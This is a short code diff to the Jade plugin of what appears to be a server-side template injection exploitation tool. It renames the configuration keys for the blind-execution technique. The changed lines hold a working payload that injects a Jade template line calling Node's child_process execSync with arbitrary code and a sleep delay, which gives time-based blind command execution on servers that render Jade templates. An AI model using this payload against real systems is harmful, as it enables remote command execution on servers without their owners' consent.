@@ -34,14 +34,14 @@ class Jade(Plugin):
             'evaluate': '- %(code)s'
         },
         'blind' : {
-            'call': 'blind_execute',
+            'call': 'execute_blind',
             'bool_true' : 'TRUE',
             'bool_false' : 'FALSE'
         },
         # Not using execute here since it's rendered and requires set headers and trailers
-        'blind_execute_bool' : {
+        'execute_blind' : {
             'call': 'inject',
-            'blind_execute_bool': """\n- global.process.mainModule.require("child_process").execSync("%(code)s && sleep %(delay)i")//"""
+            'execute_blind': """\n- global.process.mainModule.require("child_process").execSync("%(code)s && sleep %(delay)i")//"""
         },
         'execute' : {
             'call': 'render',
